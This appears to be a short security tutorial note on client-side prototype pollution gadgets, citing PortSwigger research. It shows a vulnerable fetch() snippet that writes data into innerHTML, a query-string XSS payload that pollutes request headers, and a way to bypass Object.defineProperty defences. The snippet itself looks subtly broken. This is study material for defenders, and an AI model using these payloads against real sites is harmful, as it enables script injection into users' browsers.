Research: https://portswigger.net/research/widespread-prototype-pollution-gadgets

## Prototype pollution via fetch()
We can control any undefined properties of the options object passed to `fetch()`.

```js
fetch('/my-products.json',{method:"GET"})
    .then((response) => response.json())
    .then((data) => {
        let username = data['x-username'];
        let message = document.querySelector('.message');
        if(username) {
            message.innerHTML = `My products. Logged in as <b>${username}</b>`;
        }
        let productList = document.querySelector('ul.products');
        for(let product of data) {
            let product = document.createElement('li');
            product.append(product.name);
            productList.append(product);
        }
    })
    .catch(console.error);
```

```
?__proto__[headers][x-username]=<img/src/onerror=alert(1)>
```

## Prototype pollution via Object.defineProperty()
Developers may attempt to block potential gadgets by using:
```js
Object.defineProperty(vulnerableObject, 'gadgetProperty', {
    configurable: false,
    writable: false
})
```

An attacker may be able to bypass this defense by polluting `Object.prototype` with a malicious `value` property. If this is inherited by the descriptor object passed to `Object.defineProperty()`, the attacker-controlled value may be assigned to the gadget property after all.

Research: https://portswigger.net/research/widespread-prototype-pollution-gadgets
